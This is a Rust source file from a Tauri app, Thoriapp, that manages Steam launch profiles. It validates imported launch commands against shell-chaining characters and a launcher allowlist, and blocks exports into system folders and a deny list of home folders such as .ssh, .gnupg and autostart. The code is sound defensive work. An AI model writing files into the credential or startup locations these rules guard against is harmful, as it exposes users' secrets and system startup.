use serde::{Deserialize, Serialize};
use std::fs;
use std::io::ErrorKind;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Profile {
    pub id: String,
    pub name: String,
    pub appid: u32,
    pub game_name: String,
    pub enabled_params: Vec<bool>,
    pub selected_community_recs: Vec<usize>,
    pub selected_engine_recs: Vec<usize>,
    pub force_proton: bool,
    pub expert_mode: bool,
    pub manual_command: Option<String>,
    pub use_manual_command: bool,
    pub notes: Option<String>,
    pub created_at: String,
    pub updated_at: String,
    #[serde(default)]
    pub order: u32,
    /// Versión del formato. Ausente en los archivos anteriores a este campo, que
    /// se tratan como versión 1 (su estructura es la misma).
    #[serde(default)]
    pub version: Option<u32>,
}

/// Comprueba que un perfil importado es coherente antes de guardarlo.
///
/// La validación de `serde` solo garantiza que los tipos cuadran: un archivo
/// podía traer `name` de 4 MB o `enabled_params` con cien mil entradas y pasaba.
/// Devuelve `Err(motivo)` con el primer problema encontrado.
fn validate_imported_profile(profile: &Profile) -> Result<(), String> {
    if let Some(v) = profile.version {
        if v > PROFILE_SCHEMA_VERSION {
            return Err(format!(
                "Este perfil es de una versión más nueva de Thoriapp (formato {}; esta \
                 versión entiende hasta el {}). Actualiza la app para poder importarlo.",
                v, PROFILE_SCHEMA_VERSION
            ));
        }
    }

    if profile.name.trim().is_empty() {
        return Err("Hay un perfil sin nombre y no se puede importar.".to_string());
    }
    if profile.name.chars().count() > MAX_PROFILE_TEXT {
        return Err(format!(
            "El nombre «{}…» es demasiado largo (máximo {} caracteres).",
            profile.name.chars().take(30).collect::<String>(),
            MAX_PROFILE_TEXT
        ));
    }
    if profile.game_name.chars().count() > MAX_PROFILE_TEXT {
        return Err(format!(
            "Un perfil tiene un nombre de juego demasiado largo (máximo {} caracteres).",
            MAX_PROFILE_TEXT
        ));
    }
    if let Some(notes) = profile.notes.as_ref() {
        if notes.chars().count() > MAX_PROFILE_NOTES {
            return Err(format!(
                "Las notas de «{}» son demasiado largas (máximo {} caracteres).",
                profile.name,
                MAX_PROFILE_NOTES
            ));
        }
    }

    // Las listas de selecciones son índices sobre las opciones del juego: un
    // índice fuera de rango reventaba al reconstruir el comando.
    let max_params = crate::rules::for_appid(profile.appid).params.len();
    for (label, len, limit) in [
        ("parámetros", profile.enabled_params.len(), max_params),
        (
            "recomendaciones de la comunidad",
            profile.selected_community_recs.len(),
            MAX_SELECTIONS,
        ),
        (
            "recomendaciones del motor",
            profile.selected_engine_recs.len(),
            MAX_SELECTIONS,
        ),
    ] {
        if len > limit {
            return Err(format!(
                "«{}» trae {} entradas en {}, pero como mucho puede tener {}.",
                profile.name, len, label, limit
            ));
        }
    }

    // Un índice de parámetro que no existe dejaría el perfil incoherente al
    // reconstruir su comando (el mismo appid puede tener menos opciones aquí).
    if let Some(bad) = profile.selected_community_recs.iter().find(|&&i| i >= MAX_SELECTIONS) {
        return Err(format!(
            "«{}» selecciona la recomendación {} y no existe.",
            profile.name, bad
        ));
    }
    if let Some(bad) = profile.selected_engine_recs.iter().find(|&&i| i >= MAX_SELECTIONS) {
        return Err(format!(
            "«{}» selecciona la recomendación de motor {} y no existe.",
            profile.name, bad
        ));
    }

    Ok(())
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProfilesData {
    pub profiles: Vec<Profile>,
}

fn get_profiles_dir() -> PathBuf {
    let config_dir = dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("thoriapp")
        .join("profiles");

    if !config_dir.exists() {
        fs::create_dir_all(&config_dir).ok();
    }

    config_dir
}

fn get_profiles_file() -> PathBuf {
    get_profiles_dir().join("profiles.json")
}

/// Tamaño máximo de un archivo de perfiles a importar (un perfil ocupa ~1 KB).
const MAX_IMPORT_BYTES: u64 = 5 * 1024 * 1024;
const DEFAULT_EXPORT_NAME: &str = "thoriapp_perfiles_backup.json";

/// Versión del formato de perfil que entiende esta build.
///
/// Se sube cuando un cambio deja de ser compatible hacia atrás. Un archivo con
/// `version` mayor se rechaza en vez de interpretarse a medias: es mejor decir
/// "esto es de una versión más nueva" que cargar un perfil a medias y que el
/// usuario pierda configuracion sin saber por qué.
pub const PROFILE_SCHEMA_VERSION: u32 = 1;

/// Tope de perfiles por importación. 5 MB dan para decenas de miles de perfiles
/// mínimos; ninguno real se acerca, y sin tope un archivo así bloquea la UI.
const MAX_IMPORTED_PROFILES: usize = 500;

/// Tope de longitud para los textos libres de un perfil. Con 5 MB de archivo, un
/// `name` de 4 MB pasaba la validación de tamaño global y se guardaba entero.
const MAX_PROFILE_TEXT: usize = 200;
const MAX_PROFILE_NOTES: usize = 4000;

/// Tope de índices por lista de selecciones. Ningún juego pasa de ~10 parámetros.
const MAX_SELECTIONS: usize = 64;

/// Ejecutables que Thoriapp acepta como PRIMERA palabra de un comando manual.
///
/// Es el espejo de `ALLOWED_COMMANDS` en `src/lib/command.ts`. Está duplicado a
/// propósito: el frontend lo usa para avisar mientras se escribe, y este lado
/// para no guardar un perfil que luego se lea desde otro sitio. Si se cambia uno,
/// hay que cambiar el otro (los tests de ambos lados lo comprueban).
const ALLOWED_MANUAL_COMMANDS: &[&str] = &[
    "gamemoderun",
    "mangohud",
    "gamescope",
    // Envoltorios que el propio catálogo (`games.json`) puede poner en un
    // comando. Sin ellos, "Editar manualmente" rechaza un comando que la app
    // acaba de generar.
    "prime-run",
    "obs-gamecapture",
    "vkbasalt",
    "game-performance",
    "scx_lavd",
    "WINEDLLOVERRIDES",
    "steam",
    "steam-native",
    "steam-runtime",
    "protontricks",
    "umu-run",
    "proton",
    "wine",
    "wine64",
    "winetricks",
];

/// Longitud máxima de un comando manual.
const MAX_MANUAL_COMMAND_LENGTH: usize = 2000;

/// ¿Es seguro este comando manual? Devuelve `Err(motivo)` si no lo es.
///
/// Un `manual_command` puede venir de un perfil importado, es decir, de un archivo
/// que el usuario abrió sin saber qué contiene. No se ejecuta nunca desde la app
/// (Steam lo interpreta), pero sí se copia y se pega tal cual en Steam, así que hay
/// que impedir que un archivo ajeno deje aquí una orden encadenada.
///
/// Misma lista cerrada que `checkManualCommand` del frontend, por duplicado y sin
/// dependencias: esto tiene que ser barato y obvio al leerlo.
fn check_manual_command(command: &str) -> Result<(), String> {
    let text = command.trim();

    if text.is_empty() {
        return Err("El comando está vacío.".to_string());
    }

    if text.chars().count() > MAX_MANUAL_COMMAND_LENGTH {
        return Err(format!(
            "El comando es demasiado largo (máximo {} caracteres).",
            MAX_MANUAL_COMMAND_LENGTH
        ));
    }

    // Caracteres que encadenan órdenes, redirigen o sustituyen texto por la salida
    // de otro programa. `%command%` no los lleva, así que no hay falsos positivos.
    if let Some(bad) = text
        .chars()
        .find(|c| matches!(c, ';' | '|' | '&' | '$' | '`' | '<' | '>' | '\n' | '\r'))
    {
        let shown = if bad == '\n' || bad == '\r' {
            "un salto de línea".to_string()
        } else {
            format!("«{}»", bad)
        };
        return Err(format!(
            "El comando lleva {}, que sirve para encadenar órdenes. Thoriapp solo \
             acepta una orden de lanzamiento.",
            shown
        ));
    }

    let tokens: Vec<&str> = text.split_whitespace().collect();
    let tiene_marcador = tokens.contains(&"%command%");

    // El ejecutable, si lo hay, está ANTES de `%command%`: detrás solo van
    // argumentos del juego (`-novid`, `-dx11`…), que no son programas. Buscar en
    // toda la línea lo convertía en un falso positivo con cualquier bandera.
    let cabeza: &[&str] = match tokens.iter().position(|t| *t == "%command%") {
        Some(i) => &tokens[..i],
        // Sin marcador no es una línea de Steam válida, pero se valida igual: en
        // ese caso el comando empieza directamente por el programa.
        None => &tokens[..],
    };

    let first = cabeza.iter().find(|t| !t.contains('='));

    if first.is_none() && !tiene_marcador {
        return Err(
            "El comando no lleva %command%, así que Steam no sabría qué lanzar.".to_string(),
        );
    }

    // Un comando puede ser solo variables de entorno + `%command%`: ahí no hay
    // programa propio que validar.
    let Some(first) = first else {
        return Ok(());
    };

    let program = first.rsplit('/').next().unwrap_or(first);

    if !ALLOWED_MANUAL_COMMANDS.contains(&program) {
        return Err(format!(
            "«{}» no es un lanzador conocido. Comprueba el comando antes de usarlo: \
             un perfil importado puede traer cualquier cosa.",
            program
        ));
    }

    // Rutas absolutas y `~`: un comando legítimo se resuelve por PATH. Una ruta
    // concreta apunta a un binario arbitrario del disco. Se mira la cabeza
    // (programa y envoltorios), no los argumentos del juego.
    if cabeza
        .iter()
        .any(|t| t.starts_with('/') || t.starts_with('~'))
    {
        return Err("El comando usa una ruta del sistema. Thoriapp solo acepta órdenes \
                    que se resuelven por PATH para no lanzar un binario cualquiera."
            .to_string());
    }

    Ok(())
}

/// Convierte lo que escribe el usuario en una ruta real: quita espacios y comillas,
/// acepta `file://` (al arrastrar un archivo) y expande `~` a la carpeta personal.
fn expand_path(raw: &str) -> PathBuf {
    let mut s = raw.trim();

    if s.len() >= 2 {
        let b = s.as_bytes();
        let first = b[0];
        let last = b[s.len() - 1];
        if (first == b'"' && last == b'"') || (first == b'\'' && last == b'\'') {
            s = &s[1..s.len() - 1];
        }
    }

    if let Some(rest) = s.strip_prefix("file://") {
        s = rest;
    }

    if s == "~" {
        return dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
    }
    if let Some(rest) = s.strip_prefix("~/") {
        if let Some(home) = dirs::home_dir() {
            return home.join(rest);
        }
    }

    PathBuf::from(s)
}

/// Un usuario normal no puede escribir directamente en `/home/` (solo en `/home/<su_usuario>/`).
/// Si la ruta es un archivo colgando de `/home/`, se usa la carpeta personal en su lugar.
fn redirect_from_home_root(path: PathBuf) -> PathBuf {
    if path.extension().is_some() && path.parent() == Some(Path::new("/home")) {
        if let (Some(name), Some(home)) = (path.file_name(), dirs::home_dir()) {
            return home.join(name);
        }
    }
    path
}

/// Nombre de archivo seguro a partir de un texto cualquiera.
fn sanitize_filename(name: &str) -> String {
    let cleaned: String = name
        .chars()
        .map(|c| if c.is_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
        .collect();
    let trimmed = cleaned.trim_matches('_');
    if trimmed.is_empty() {
        "perfil".to_string()
    } else {
        trimmed.to_string()
    }
}

/// Mensaje de error de archivo comprensible para el usuario.
fn io_error_message(action: &str, path: &Path, e: &std::io::Error) -> String {
    match e.kind() {
        ErrorKind::NotFound => format!("{}: no existe «{}»", action, path.display()),
        ErrorKind::PermissionDenied => format!(
            "{}: sin permiso para «{}». Prueba con una ruta dentro de tu carpeta personal (por ejemplo ~/Descargas).",
            action,
            path.display()
        ),
        _ => format!("{}: {} ({})", action, e, path.display()),
    }
}

/// Escritura atómica: se escribe un archivo temporal y se renombra, así un corte a mitad
/// de guardado no deja el archivo real a medias.
fn write_atomic(path: &Path, content: &str) -> std::io::Result<()> {
    let mut tmp_name = path
        .file_name()
        .map(|n| n.to_os_string())
        .unwrap_or_default();
    tmp_name.push(".tmp");
    let tmp = path.with_file_name(tmp_name);

    fs::write(&tmp, content)?;
    if let Err(e) = fs::rename(&tmp, path) {
        let _ = fs::remove_file(&tmp);
        return Err(e);
    }
    Ok(())
}

fn load_profiles_data() -> ProfilesData {
    let file = get_profiles_file();

    if file.exists() {
        match fs::read_to_string(&file) {
            Ok(content) => match serde_json::from_str::<ProfilesData>(&content) {
                Ok(data) => return data,
                Err(e) => {
                    // El archivo existe pero no se pudo leer: se guarda una copia antes de
                    // que un guardado posterior lo sobrescriba con una lista vacía.
                    println!("[Perfiles] ⚠️ profiles.json ilegible: {}", e);
                    let backup = file.with_extension("json.corrupt.bak");
                    fs::write(&backup, &content).ok();
                }
            },
            Err(e) => println!("[Perfiles] ⚠️ No se pudo leer profiles.json: {}", e),
        }
    }

    ProfilesData {
        profiles: Vec::new(),
    }
}

fn save_profiles_data(data: &ProfilesData) -> Result<(), String> {
    let file = get_profiles_file();
    let content = serde_json::to_string_pretty(data)
        .map_err(|e| format!("Error al serializar: {}", e))?;

    write_atomic(&file, &content).map_err(|e| format!("Error al guardar: {}", e))?;

    Ok(())
}

/// Calcula la ruta final de una exportación y comprueba que se puede usar.
///
/// Antes bastaba con que la carpeta existiera: se podía escribir en cualquier
/// sitio (`/etc`, `~/.config/autostart`, …). Un perfil exportado no debería
/// poder colocarse donde el sistema lo ejecute o lo cargue solo. Ahora la ruta
/// tiene que estar dentro de una carpeta donde el usuario guarda archivos.
fn resolve_export_path(raw: &str, default_name: &str) -> Result<PathBuf, String> {
    if raw.trim().is_empty() {
        return Err("No se indicó ninguna ruta de archivo.".to_string());
    }

    let mut path = redirect_from_home_root(expand_path(raw));

    // Si indicaron solo una carpeta, se crea el archivo dentro con un nombre por defecto
    if path.is_dir() {
        path = path.join(default_name);
    }

    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() && !parent.is_dir() {
            // Se comprueba ANTES si la ubicación está permitida: si no lo está,
            // el mensaje útil es «no puedes exportar ahí», no «la carpeta no
            // existe» (que confundiría al usuario sobre el motivo real).
            check_export_destination(&path)?;

            // La carpeta por defecto que sugiere la interfaz (`~/Descargas`) no
            // existe en todas las instalaciones: el nombre depende del idioma del
            // sistema. Se crea, para que el valor por defecto no falle con «la
            // carpeta no existe». Si el permiso no da, el error lo dice.
            fs::create_dir_all(parent).map_err(|e| {
                io_error_message("No se pudo crear la carpeta de destino", parent, &e)
            })?;

            // Y si aun así no se pudo (algo la bloqueó), no se sigue adelante.
            if !parent.is_dir() {
                return Err(format!("La carpeta «{}» no existe.", parent.display()));
            }
        }
    }

    check_export_destination(&path)?;

    Ok(path)
}

/// Carpetas de configuración: aunque estén dentro de `$HOME`, escribir ahí es
/// justo lo que convierte un perfil exportado en algo que el sistema carga solo.
const BLOCKED_HOME_DIRS: &[&str] = &[
    ".config",
    ".local",
    ".ssh",
    ".gnupg",
    ".bashrc",
    ".profile",
    ".bash_profile",
    ".zshrc",
    ".xsessionrc",
    ".xinitrc",
    "autostart",
];

/// Comprueba que una ruta de exportación es un sitio razonable para un archivo
/// de datos del usuario.
///
/// Rechaza tres cosas:
///   - carpetas del sistema (`/etc`, `/usr`, `/tmp`…), donde escribir requiere
///     root o afecta a otros usuarios;
///   - carpetas de configuración del propio usuario (`.config`, `.local`, …);
///   - destinos que no son un archivo JSON.
///
/// No se siguen enlaces simbólicos hasta el final: si el archivo de destino es
/// un symlink, se resuelve y se valida el destino real, para no escribir a través
/// de él en un sitio prohibido.
fn check_export_destination(path: &Path) -> Result<(), String> {
    let home = dirs::home_dir()
        .and_then(|h| h.canonicalize().ok())
        .ok_or("No se pudo determinar tu carpeta personal.")?;
    check_export_destination_in(path, &home)
}

/// Igual que `check_export_destination` pero con `$HOME` explícito, para que los
/// tests ejerciten ESTA función y no una copia de su lógica.
fn check_export_destination_in(path: &Path, home: &Path) -> Result<(), String> {
    // Si el destino ya existe como symlink, se valida el archivo al que apunta.
    let efectivo = if path.symlink_metadata().map(|m| m.file_type().is_symlink()).unwrap_or(false) {
        path.canonicalize().unwrap_or_else(|_| path.to_path_buf())
    } else {
        path.to_path_buf()
    };

    // La extensión importa: un `.json` no lo ejecuta ni lo carga ningún sistema.
    let es_json = efectivo
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.eq_ignore_ascii_case("json"))
        .unwrap_or(false);
    if !es_json {
        return Err("El archivo de exportación debe terminar en .json.".to_string());
    }

    if let Some(name) = efectivo.file_name().and_then(|n| n.to_str()) {
        if name.starts_with('.') {
            return Err("No se puede exportar a un archivo oculto.".to_string());
        }
    }

    // Referencia canónica de $HOME para comparar con `starts_with`.
    let home = home.to_path_buf();

    // La carpeta donde se va a escribir, ya resuelta.
    let destino = efectivo
        .parent()
        .map(|p| p.canonicalize().unwrap_or_else(|_| p.to_path_buf()))
        .unwrap_or_default();

    if destino.starts_with(&home) {
        // Dentro de casa: se bloquean las carpetas de configuración y autostart.
        let relativo = destino.strip_prefix(&home).unwrap_or(&destino);
        let primer_componente = relativo
            .components()
            .next()
            .and_then(|c| c.as_os_str().to_str())
            .unwrap_or("");

        if BLOCKED_HOME_DIRS.contains(&primer_componente) {
            return Err(format!(
                "No se puede exportar dentro de «{primer_componente}»: es una carpeta de configuración \
                 y el sistema podría cargar el archivo por su cuenta. Usa Descargas o una subcarpeta tuya."
            ));
        }

        // `..` disfrazado que acabara fuera no llega aquí (ya se resolvió arriba),
        // pero un componente oculto sí: `.config` dentro de una subcarpeta.
        if relativo.components().any(|c| {
            c.as_os_str()
                .to_str()
                .map(|s| BLOCKED_HOME_DIRS.contains(&s))
                .unwrap_or(false)
        }) {
            return Err(
                "La ruta pasa por una carpeta de configuración. Elige otra ubicación.".to_string(),
            );
        }

        // Dentro de casa se permite cualquier carpeta que no sea de configuración:
        // quitar cada nombre posible rompería usos legítimos (una carpeta propia,
        // un disco montado en casa, etc.).
        return Ok(());
    }

    // Fuera de casa: solo las carpetas de datos habituales del sistema.
    const SISTEMA_PERMITIDO: &[&str] = &["/tmp"];
    if SISTEMA_PERMITIDO.iter().any(|d| destino.starts_with(d)) {
        return Ok(());
    }

    Err(format!(
        "Solo se puede exportar dentro de tu carpeta personal o en {}. La ruta «{}» queda fuera.",
        SISTEMA_PERMITIDO.join(", "),
        destino.display()
    ))
}

// La firma es plana a propósito: es el contrato que invoca el frontend.
// Cambiarla por un struct obligaría a tocar api.ts y todos los llamadores.
#[allow(clippy::too_many_arguments)]
#[tauri::command]
pub fn save_profile(
    name: String,
    appid: u32,
    game_name: String,
    enabled_params: Vec<bool>,
    selected_community_recs: Vec<usize>,
    selected_engine_recs: Vec<usize>,
    force_proton: bool,
    expert_mode: bool,
    manual_command: Option<String>,
    use_manual_command: bool,
    notes: Option<String>,
) -> Result<Profile, String> {
    // Se valida antes de tocar el disco: el comando manual que llega aquí puede
    // venir de un perfil que se acaba de importar.
    if use_manual_command {
        if let Some(cmd) = manual_command.as_deref().filter(|c| !c.trim().is_empty()) {
            check_manual_command(cmd)?;
        }
    }

    let mut data = load_profiles_data();

    let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
    let next_order = data.profiles.iter().map(|p| p.order).max().unwrap_or(0) + 1;

    let profile = Profile {
        id: format!("{}_{}", appid, now.replace([':', ' ', '-'], "")),
        name,
        appid,
        game_name,
        enabled_params,
        selected_community_recs,
        selected_engine_recs,
        force_proton,
        expert_mode,
        manual_command,
        use_manual_command,
        notes,
        created_at: now.clone(),
        updated_at: now,
        order: next_order,
        version: Some(PROFILE_SCHEMA_VERSION),
    };

    data.profiles.push(profile.clone());
    save_profiles_data(&data)?;

    Ok(profile)
}

#[tauri::command]
pub fn load_profiles() -> Result<Vec<Profile>, String> {
    let data = load_profiles_data();
    Ok(data.profiles)
}

#[tauri::command]
pub fn load_profiles_for_game(appid: u32) -> Result<Vec<Profile>, String> {
    let data = load_profiles_data();
    let profiles = data.profiles.into_iter()
        .filter(|p| p.appid == appid)
        .collect();
    Ok(profiles)
}

#[tauri::command]
pub fn delete_profile(profile_id: String) -> Result<(), String> {
    let mut data = load_profiles_data();
    data.profiles.retain(|p| p.id != profile_id);
    save_profiles_data(&data)?;
    Ok(())
}

/// Exporta un perfil. Devuelve la ruta donde se guardó realmente.
#[tauri::command]
pub fn export_profile(profile_id: String, path: String) -> Result<String, String> {
    let data = load_profiles_data();

    let profile = data
        .profiles
        .iter()
        .find(|p| p.id == profile_id)
        .ok_or("Perfil no encontrado")?;

    let default_name = format!(
        "{}_{}.json",
        sanitize_filename(&profile.game_name),
        sanitize_filename(&profile.name)
    );
    let target = resolve_export_path(&path, &default_name)?;

    let content = serde_json::to_string_pretty(profile)
        .map_err(|e| format!("Error al serializar: {}", e))?;

    write_atomic(&target, &content)
        .map_err(|e| io_error_message("No se pudo exportar", &target, &e))?;

    Ok(target.display().to_string())
}

/// Lógica común de importación: recibe el TEXTO del archivo (un perfil `{...}` o una lista `[...]`).
/// Un perfil del archivo, tal como se ve en la vista previa.
///
/// La vista previa NO escribe nada: solo dice qué pasaría si se confirmara. Así
/// el usuario ve antes de aceptar si algún perfil trae un comando raro, en vez de
/// descubrirlo después de que ya esté guardado.
#[derive(Debug, Clone, Serialize)]
pub struct ImportedProfilePreview {
    pub id: String,
    pub name: String,
    pub game_name: String,
    pub appid: u32,
    /// Nombres de las opciones activadas, ya resueltas en texto legible.
    pub enabled_params: Vec<String>,
    /// Comando manual que trae el perfil, si trae alguno.
    pub manual_command: Option<String>,
    /// `true` si se conservará su comando; `false` si se le va a quitar.
    pub keeps_manual_command: bool,
    /// Por qué se le quita el comando (vacío si se conserva o no tiene).
    pub manual_command_reason: String,
    /// Ya hay un perfil guardado con este id: se omitirá.
    pub duplicate: bool,
}

/// Resultado de analizar un archivo de perfiles, sin tocar disco.
#[derive(Debug, Clone, Serialize)]
pub struct ImportPreview {
    /// Perfiles que se van a importar de verdad (sin los duplicados).
    pub profiles: Vec<ImportedProfilePreview>,
    /// Cuántos se omitirán por estar ya guardados.
    pub duplicates: usize,
    /// Cuántos traen un comando manual que se les va a quitar.
    pub stripped_commands: usize,
}

/// Analiza el contenido de un archivo y devuelve qué se importaría. NO escribe.
fn preview_from_content(raw: &str) -> Result<ImportPreview, String> {
    let profiles = parse_imported_profiles(raw)?;
    let existing = load_profiles_data();

    let mut previews = Vec::new();
    let mut duplicates = 0;
    let mut stripped = 0;

    for profile in profiles {
        // Lo mismo que hará `apply_import_content`: si aquí se dice una cosa y
        // luego se hace otra, la vista previa no sirve de nada.
        let duplicate = existing.profiles.iter().any(|p| p.id == profile.id);

        let has_command = profile
            .manual_command
            .as_deref()
            .map(|c| !c.trim().is_empty())
            .unwrap_or(false);
        let command_error = profile
            .manual_command
            .as_deref()
            .filter(|c| !c.trim().is_empty())
            .and_then(|c| check_manual_command(c).err());
        let keeps = has_command && command_error.is_none();

        if has_command && !keeps {
            stripped += 1;
        }
        if duplicate {
            duplicates += 1;
            continue;
        }

        // Se calculan antes de mover campos al struct: `enabled_param_labels`
        // necesita el perfil entero y ya no existiría a mitad de la construcción.
        let enabled_params = enabled_param_labels(&profile);

        previews.push(ImportedProfilePreview {
            id: profile.id,
            name: profile.name,
            game_name: profile.game_name,
            appid: profile.appid,
            enabled_params,
            manual_command: profile.manual_command,
            keeps_manual_command: keeps,
            manual_command_reason: command_error.unwrap_or_default(),
            duplicate,
        });
    }

    Ok(ImportPreview {
        profiles: previews,
        duplicates,
        stripped_commands: stripped,
    })
}

/// Texto legible de las opciones activadas de un perfil, para la vista previa.
fn enabled_param_labels(profile: &Profile) -> Vec<String> {
    let rules = crate::rules::for_appid(profile.appid);
    rules
        .params
        .iter()
        .enumerate()
        .filter(|(i, _)| profile.enabled_params.get(*i).copied().unwrap_or(false))
        .map(|(_, p)| p.value.clone())
        .collect()
}

/// Valida y parsea el archivo. Es la puerta común de la vista previa y de la
/// importación real, para que no puedan discrepar sobre qué es válido.
fn parse_imported_profiles(raw: &str) -> Result<Vec<Profile>, String> {
    if raw.len() as u64 > MAX_IMPORT_BYTES {
        return Err("El archivo es demasiado grande para ser un perfil (máximo 5 MB).".to_string());
    }

    let content = raw.trim_start_matches('\u{feff}');

    let value: serde_json::Value = serde_json::from_str(content)
        .map_err(|e| format!("El archivo no es un JSON válido: {}", e))?;

    let profiles: Vec<Profile> = if value.is_array() {
        serde_json::from_value::<Vec<Profile>>(value).map_err(|e| {
            format!("Algún perfil del archivo no tiene el formato correcto: {}", e)
        })?
    } else if value.is_object() {
        let single = serde_json::from_value::<Profile>(value).map_err(|e| {
            format!("El archivo no tiene el formato de un perfil de Thoriapp: {}", e)
        })?;
        vec![single]
    } else {
        return Err("El archivo no contiene perfiles de Thoriapp.".to_string());
    };

    if profiles.is_empty() {
        return Err("El archivo no contiene ningún perfil.".to_string());
    }

    if profiles.len() > MAX_IMPORTED_PROFILES {
        return Err(format!(
            "El archivo trae {} perfiles y el máximo por importación es {}. \
             Impórtalos por tandas.",
            profiles.len(),
            MAX_IMPORTED_PROFILES
        ));
    }

    // Se valida el contenido de TODOS antes de escribir nada: si uno está mal, no
    // se importa ninguno. Una importación a medias es peor que ninguna.
    for profile in &profiles {
        validate_imported_profile(profile)?;
    }

    Ok(profiles)
}

fn import_from_content(raw: &str) -> Result<Vec<Profile>, String> {
    let profiles = parse_imported_profiles(raw)?;

    let total = profiles.len();
    let mut data = load_profiles_data();
    let mut next_order = data
        .profiles
        .iter()
        .map(|p| p.order)
        .max()
        .map(|m| m + 1)
        .unwrap_or(0);
    let mut imported: Vec<Profile> = Vec::new();

    for mut profile in profiles {
        if data.profiles.iter().any(|p| p.id == profile.id) {
            continue;
        }

        // Un perfil importado no puede imponer un comando manual. Si trae uno que no
        // pasa la comprobación, se importa igual (para no perder sus opciones) pero
        // se le quita el comando y se desactiva: el usuario ve el perfil, y si
        // quiere ese comando lo escribe él, que entonces sí es su decisión.
        if let Some(cmd) = profile.manual_command.as_deref() {
            if !cmd.trim().is_empty() && check_manual_command(cmd).is_err() {
                profile.manual_command = None;
                profile.use_manual_command = false;
            }
        }

        // Se colocan al final de la lista, sin pisar el orden de los existentes
        profile.order = next_order;
        next_order += 1;

        data.profiles.push(profile.clone());
        imported.push(profile);
    }

    if imported.is_empty() {
        let msg = if total == 1 {
            "Este perfil ya está guardado (mismo ID), no se importó nada.".to_string()
        } else {
            format!(
                "No se importó nada: los {} perfiles del archivo ya están guardados.",
                total
            )
        };
        return Err(msg);
    }

    save_profiles_data(&data)?;

    Ok(imported)
}

/// Importa perfiles a partir del CONTENIDO de un archivo ya leído por la pantalla.
/// Es lo que usa el botón "Importar perfil": el navegador solo da el nombre del archivo,
/// no su ruta completa, así que la pantalla lee el archivo y envía su texto.
#[tauri::command]
pub fn import_profile_from_text(content: String) -> Result<Vec<Profile>, String> {
    import_from_content(&content)
}

/// Mira qué se importaría, SIN escribir nada.
///
/// La pantalla enseña esto en un cuadro de confirmación y solo llama a
/// `import_profile_from_text` si el usuario acepta. Antes ambas cosas eran la
/// misma llamada: el perfil ya estaba guardado cuando el usuario se enteraba de
/// lo que traía.
#[tauri::command]
pub fn preview_import_profile(content: String) -> Result<ImportPreview, String> {
    preview_from_content(&content)
}

// Mismo contrato plano que save_profile (ver comentario allí).
#[allow(clippy::too_many_arguments)]
#[tauri::command]
pub fn update_profile(
    profile_id: String,
    name: String,
    enabled_params: Vec<bool>,
    selected_community_recs: Vec<usize>,
    selected_engine_recs: Vec<usize>,
    force_proton: bool,
    expert_mode: bool,
    manual_command: Option<String>,
    use_manual_command: bool,
    notes: Option<String>,
) -> Result<Profile, String> {
    if use_manual_command {
        if let Some(cmd) = manual_command.as_deref().filter(|c| !c.trim().is_empty()) {
            check_manual_command(cmd)?;
        }
    }

    let mut data = load_profiles_data();

    let profile = data.profiles.iter_mut()
        .find(|p| p.id == profile_id)
        .ok_or("Perfil no encontrado")?;

    profile.name = name;
    profile.enabled_params = enabled_params;
    profile.selected_community_recs = selected_community_recs;
    profile.selected_engine_recs = selected_engine_recs;
    profile.force_proton = force_proton;
    profile.expert_mode = expert_mode;
    profile.manual_command = manual_command;
    profile.use_manual_command = use_manual_command;
    profile.notes = notes;
    profile.updated_at = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();

    let updated_profile = profile.clone();
    save_profiles_data(&data)?;

    Ok(updated_profile)
}

#[tauri::command]
pub fn reorder_profiles(profile_ids: Vec<String>) -> Result<(), String> {
    let mut data = load_profiles_data();

    for (index, profile_id) in profile_ids.iter().enumerate() {
        if let Some(profile) = data.profiles.iter_mut().find(|p| &p.id == profile_id) {
            profile.order = index as u32;
        }
    }

    data.profiles.sort_by_key(|p| p.order);
    save_profiles_data(&data)?;

    Ok(())
}

/// Exporta todos los perfiles en una lista. Devuelve la ruta donde se guardó realmente.
#[tauri::command]
pub fn export_all_profiles(path: String) -> Result<String, String> {
    let data = load_profiles_data();

    if data.profiles.is_empty() {
        return Err("No hay perfiles para exportar.".to_string());
    }

    let target = resolve_export_path(&path, DEFAULT_EXPORT_NAME)?;

    let content = serde_json::to_string_pretty(&data.profiles)
        .map_err(|e| format!("Error al serializar: {}", e))?;

    write_atomic(&target, &content)
        .map_err(|e| io_error_message("No se pudo exportar", &target, &e))?;

    Ok(target.display().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- check_manual_command: lo que sí se acepta ----

    #[test]
    fn acepta_variables_de_entorno_y_el_marcador() {
        assert!(check_manual_command("DXVK_HUD=fps %command%").is_ok());
        assert!(check_manual_command("%command%").is_ok());
        assert!(check_manual_command("PROTON_ENABLE_NVAPI=1 %command% -novid").is_ok());
    }

    #[test]
    fn no_confunde_una_bandera_del_juego_con_el_programa() {
        // Regresión: todo lo que va DESPUÉS de `%command%` son argumentos del juego.
        // Antes se buscaba el programa en la línea entera y `-novid` se tomaba como
        // ejecutable, así que cualquier comando con banderas se rechazaba.
        for cmd in [
            "%command% -novid",
            "PROTON_ENABLE_NVAPI=1 %command% -novid",
            "mangohud %command% -dx11 -novid",
            "DXVK_HUD=fps %command% -console",
        ] {
            assert!(check_manual_command(cmd).is_ok(), "debería aceptar: {cmd}");
        }
    }

    #[test]
    fn rechaza_un_comando_sin_marcador_ni_programa() {
        let err = check_manual_command("DXVK_HUD=fps").unwrap_err();
        assert!(err.contains("%command%"), "mensaje: {err}");
    }

    #[test]
    fn acepta_envoltorios_conocidos() {
        for cmd in [
            "gamemoderun mangohud %command%",
            "mangohud %command%",
            "gamescope -W 1920 -H 1080 -f -- %command%",
            "prime-run %command%",
            "steam-native %command%",
        ] {
            assert!(check_manual_command(cmd).is_ok(), "debería aceptar: {cmd}");
        }
    }

    #[test]
    fn acepta_los_envoltorios_que_el_catalogo_pone_en_un_comando() {
        // `games.json` declara estos como `kind: "wrapper"`: la app los mete en
        // el comando, así que el validador no puede rechazarlos después.
        for w in [
            "game-performance",
            "scx_lavd",
            "prime-run",
            "vkbasalt",
